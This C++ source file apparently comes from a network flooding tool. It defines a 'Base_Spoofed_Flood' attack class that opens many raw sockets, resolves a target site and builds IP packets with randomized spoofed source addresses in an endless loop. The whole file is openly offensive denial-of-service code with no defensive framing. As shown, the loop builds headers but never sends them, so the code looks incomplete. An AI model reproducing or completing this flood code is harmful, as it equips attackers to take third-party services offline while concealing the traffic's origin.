#include <arpa/inet.h>
#include <cstring>

#include "../Headers/Base_Spoofed_Flood.hpp"
#include "../Headers/Raw_Socket.hpp"
#include "../Headers/Logging.hpp"
#include "../Headers/Randomizer.hpp"

Base_Spoofed_Flood::Base_Spoofed_Flood(std::shared_ptr<Config> config) :
  Attack_Vector(std::move(config)){

}


void Base_Spoofed_Flood::attack(){
  std::vector<std::unique_ptr<Raw_Socket>> sockets{};
  sockets.reserve(config->CONNECTIONS);
  for(size_t i = 0; i < sockets.capacity(); ++i)
    sockets.emplace_back(std::make_unique<Raw_Socket>());
  char buf[8192], *pseudogram;
  struct Raw_Socket::pshdr psh{};
  auto *ip = (struct iphdr *) buf;
  void *hdr = (void *) (buf + sizeof(struct ip));
  struct hostent *hp{};
  struct sockaddr_in dst{};
  while(true){
    for(auto& sock : sockets){
      bzero(buf, sizeof(buf));
      if((hp = gethostbyname(config->website.c_str())) == nullptr){
        if((ip->daddr = inet_addr(config->website.c_str())) == -1){
          print_error("Can't resolve the host");
          exit(EXIT_FAILURE);
        }
      }else{
        bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
      }
      if(config->RandomizeSource){
        std::string s_addr{};
        Randomizer::randomIP(s_addr);
        if((ip->saddr = inet_addr(s_addr.c_str())) == -1)
          continue;
      }else{
        ip->saddr = 0;
      }

      init_headers(ip, hdr);
      overwrite_headers(ip, hdr);

      psh.src = ip->saddr;
      psh.dst = ip->daddr;
      psh.data = 0;
      psh.proto = sock->protocol;
      psh.len = htons(strlen(buf));
      
    }
  }
}

